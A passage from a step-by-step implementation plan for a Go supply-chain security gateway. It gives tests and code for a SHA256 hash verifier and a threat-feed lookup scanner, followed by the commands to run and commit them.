    "context"
    "crypto/sha256"
    "fmt"
    "os"
    "path/filepath"
    "testing"

    "github.com/cloudfieldcz/shieldoo-gate/internal/scanner"
    "github.com/stretchr/testify/assert"
    "github.com/stretchr/testify/require"
)

func TestHashVerifier_MatchingHash_ReturnsClean(t *testing.T) {
    dir := t.TempDir()
    path := filepath.Join(dir, "artifact.whl")
    content := []byte("test content")
    require.NoError(t, os.WriteFile(path, content, 0644))
    hash := fmt.Sprintf("%x", sha256.Sum256(content))

    s := NewHashVerifier()
    result, err := s.Scan(context.Background(), scanner.Artifact{
        Ecosystem: scanner.EcosystemPyPI,
        LocalPath: path,
        SHA256:    hash,
    })
    require.NoError(t, err)
    assert.Equal(t, scanner.VerdictClean, result.Verdict)
}

func TestHashVerifier_MismatchedHash_ReturnsMalicious(t *testing.T) {
    dir := t.TempDir()
    path := filepath.Join(dir, "artifact.whl")
    require.NoError(t, os.WriteFile(path, []byte("tampered content"), 0644))

    s := NewHashVerifier()
    result, err := s.Scan(context.Background(), scanner.Artifact{
        Ecosystem: scanner.EcosystemPyPI,
        LocalPath: path,
        SHA256:    "0000000000000000000000000000000000000000000000000000000000000000",
    })
    require.NoError(t, err)
    assert.Equal(t, scanner.VerdictMalicious, result.Verdict)
    assert.NotEmpty(t, result.Findings)
}

func TestHashVerifier_EmptyExpectedHash_ReturnsClean(t *testing.T) {
    dir := t.TempDir()
    path := filepath.Join(dir, "artifact.whl")
    require.NoError(t, os.WriteFile(path, []byte("content"), 0644))

    s := NewHashVerifier()
    result, err := s.Scan(context.Background(), scanner.Artifact{
        Ecosystem: scanner.EcosystemPyPI,
        LocalPath: path,
        SHA256:    "", // no expected hash to compare
    })
    require.NoError(t, err)
    assert.Equal(t, scanner.VerdictClean, result.Verdict)
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `go test ./internal/scanner/builtin/ -v -run TestHashVerifier`
Expected: FAIL

- [ ] **Step 3: Implement Hash Verifier**

```go
// internal/scanner/builtin/hash_verifier.go
package builtin

import (
    "context"
    "crypto/sha256"
    "fmt"
    "io"
    "os"

    "github.com/cloudfieldcz/shieldoo-gate/internal/scanner"
)

type HashVerifier struct{}

func NewHashVerifier() *HashVerifier {
    return &HashVerifier{}
}

func (v *HashVerifier) Name() string    { return "builtin-hash-verifier" }
func (v *HashVerifier) Version() string { return "1.0.0" }
func (v *HashVerifier) SupportedEcosystems() []scanner.Ecosystem {
    return []scanner.Ecosystem{scanner.EcosystemPyPI, scanner.EcosystemNPM, scanner.EcosystemDocker, scanner.EcosystemNuGet}
}
func (v *HashVerifier) HealthCheck(_ context.Context) error { return nil }

func (v *HashVerifier) Scan(_ context.Context, artifact scanner.Artifact) (scanner.ScanResult, error) {
    if artifact.SHA256 == "" {
        return scanner.ScanResult{
            Verdict:    scanner.VerdictClean,
            Confidence: 0.5,
            ScannerID:  v.Name(),
        }, nil
    }

    f, err := os.Open(artifact.LocalPath)
    if err != nil {
        return scanner.ScanResult{Verdict: scanner.VerdictClean, ScannerID: v.Name(), Error: err}, nil
    }
    defer f.Close()

    h := sha256.New()
    if _, err := io.Copy(h, f); err != nil {
        return scanner.ScanResult{Verdict: scanner.VerdictClean, ScannerID: v.Name(), Error: err}, nil
    }

    actual := fmt.Sprintf("%x", h.Sum(nil))
    if actual != artifact.SHA256 {
        return scanner.ScanResult{
            Verdict:    scanner.VerdictMalicious,
            Confidence: 1.0,
            Findings: []scanner.Finding{{
                Severity:    scanner.SeverityCritical,
                Category:    "hash-mismatch",
                Description: fmt.Sprintf("SHA256 mismatch: expected %s, got %s", artifact.SHA256, actual),
                Location:    artifact.LocalPath,
            }},
            ScannerID: v.Name(),
        }, nil
    }

    return scanner.ScanResult{
        Verdict:    scanner.VerdictClean,
        Confidence: 1.0,
        ScannerID:  v.Name(),
    }, nil
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `go test ./internal/scanner/builtin/ -v -run TestHashVerifier`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add internal/scanner/builtin/hash_verifier.go internal/scanner/builtin/hash_verifier_test.go
git commit -m "feat(scanner): add Hash Verifier for SHA256 integrity checking"
```

---

### Task 7: Threat Feed Checker (Built-in Scanner)

**Files:**
- Create: `internal/scanner/builtin/threat_feed_checker.go`
- Test: `internal/scanner/builtin/threat_feed_checker_test.go`

Fast-path lookup against the local `threat_feed` DB table by SHA256.

- [ ] **Step 1: Write tests**

```go
// internal/scanner/builtin/threat_feed_checker_test.go
package builtin

import (
    "context"
    "testing"

    "github.com/cloudfieldcz/shieldoo-gate/internal/config"
    "github.com/cloudfieldcz/shieldoo-gate/internal/scanner"
    "github.com/stretchr/testify/assert"
    "github.com/stretchr/testify/require"
)

func TestThreatFeedChecker_KnownMalicious_ReturnsMalicious(t *testing.T) {
    db, err := config.InitDB(":memory:")
    require.NoError(t, err)
    defer db.Close()

    // Insert a known malicious entry
    _, err = db.Exec(`INSERT INTO threat_feed (sha256, ecosystem, package_name, version, reported_at)
        VALUES ('abc123', 'pypi', 'evil-package', '1.0.0', datetime('now'))`)
    require.NoError(t, err)

    s := NewThreatFeedChecker(db)
    result, err := s.Scan(context.Background(), scanner.Artifact{
        Ecosystem: scanner.EcosystemPyPI,
        SHA256:    "abc123",
    })
    require.NoError(t, err)
    assert.Equal(t, scanner.VerdictMalicious, result.Verdict)
    assert.Equal(t, float32(1.0), result.Confidence)
}

func TestThreatFeedChecker_UnknownHash_ReturnsClean(t *testing.T) {
    db, err := config.InitDB(":memory:")
    require.NoError(t, err)
    defer db.Close()

    s := NewThreatFeedChecker(db)
    result, err := s.Scan(context.Background(), scanner.Artifact{
        Ecosystem: scanner.EcosystemPyPI,
        SHA256:    "unknown-hash",
    })
    require.NoError(t, err)
    assert.Equal(t, scanner.VerdictClean, result.Verdict)
}

func TestThreatFeedChecker_EmptyFeed_ReturnsClean(t *testing.T) {
    db, err := config.InitDB(":memory:")
    require.NoError(t, err)
    defer db.Close()

    s := NewThreatFeedChecker(db)
    result, err := s.Scan(context.Background(), scanner.Artifact{
        Ecosystem: scanner.EcosystemPyPI,
        SHA256:    "any-hash",
    })
    require.NoError(t, err)
    assert.Equal(t, scanner.VerdictClean, result.Verdict)
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `go test ./internal/scanner/builtin/ -v -run TestThreatFeedChecker`
Expected: FAIL

- [ ] **Step 3: Implement Threat Feed Checker**

```go
// internal/scanner/builtin/threat_feed_checker.go
package builtin

import (
    "context"
    "database/sql"

    "github.com/cloudfieldcz/shieldoo-gate/internal/scanner"
    "github.com/jmoiron/sqlx"
)

type ThreatFeedChecker struct {
    db *sqlx.DB
}

func NewThreatFeedChecker(db *sqlx.DB) *ThreatFeedChecker {
    return &ThreatFeedChecker{db: db}
}

func (c *ThreatFeedChecker) Name() string    { return "builtin-threat-feed" }
func (c *ThreatFeedChecker) Version() string { return "1.0.0" }
func (c *ThreatFeedChecker) SupportedEcosystems() []scanner.Ecosystem {
    return []scanner.Ecosystem{scanner.EcosystemPyPI, scanner.EcosystemNPM, scanner.EcosystemDocker, scanner.EcosystemNuGet}
}
func (c *ThreatFeedChecker) HealthCheck(_ context.Context) error { return nil }

func (c *ThreatFeedChecker) Scan(ctx context.Context, artifact scanner.Artifact) (scanner.ScanResult, error) {
    var packageName string
    err := c.db.GetContext(ctx, &packageName,
        "SELECT package_name FROM threat_feed WHERE sha256 = ?", artifact.SHA256)

    if err == sql.ErrNoRows {
        return scanner.ScanResult{
            Verdict:    scanner.VerdictClean,
            Confidence: 1.0,
            ScannerID:  c.Name(),
        }, nil
    }
    if err != nil {
        return scanner.ScanResult{Verdict: scanner.VerdictClean, ScannerID: c.Name(), Error: err}, nil
    }

    return scanner.ScanResult{
        Verdict:    scanner.VerdictMalicious,
        Confidence: 1.0,
        Findings: []scanner.Finding{{
            Severity:    scanner.SeverityCritical,
            Category:    "threat-feed-hit",
            Description: "Artifact SHA256 matches known malicious package in threat feed: " + packageName,
        }},
        ScannerID: c.Name(),
    }, nil
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `go test ./internal/scanner/builtin/ -v -run TestThreatFeedChecker`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add internal/scanner/builtin/threat_feed_checker.go internal/scanner/builtin/threat_feed_checker_test.go
git commit -m "feat(scanner): add Threat Feed Checker for SHA256 lookup against local feed DB"
```

---

### Task 8: Verify All Phase 2 Tests Pass

- [ ] **Step 1: Run all tests**

Run: `go test ./internal/scanner/... -v -race`
Expected: All tests PASS, no race conditions.

- [ ] **Step 2: Run vet**

Run: `go vet ./internal/scanner/...`
Expected: No issues.
